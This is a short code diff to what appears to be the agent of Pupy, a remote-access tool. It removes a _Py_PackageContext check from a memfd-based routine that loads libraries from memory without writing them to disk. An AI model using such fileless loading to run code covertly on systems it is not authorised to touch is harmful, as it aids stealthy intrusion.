@@ -18,7 +18,7 @@ from pupy.agent._linux_memfd import (
 )
 
 from .utils import (
-    load_library_common, find_writable_folder, _Py_PackageContext
+    load_library_common, find_writable_folder
 )
 
 from .posix import _does_dest_allows_executable_mappings
@@ -98,7 +98,7 @@ def _change_dlname(lib, new_name):
     lm.contents.l_libname.contents.l_name = strdup(new_name)
 
 
-if _Py_PackageContext is not None and dlinfo is not None and memfd_is_supported():
+if dlinfo is not None and memfd_is_supported():
     def load_content(content, name, dlopen=False, initfuncname=None):
         fd, filepath = memfd_create()
         try:
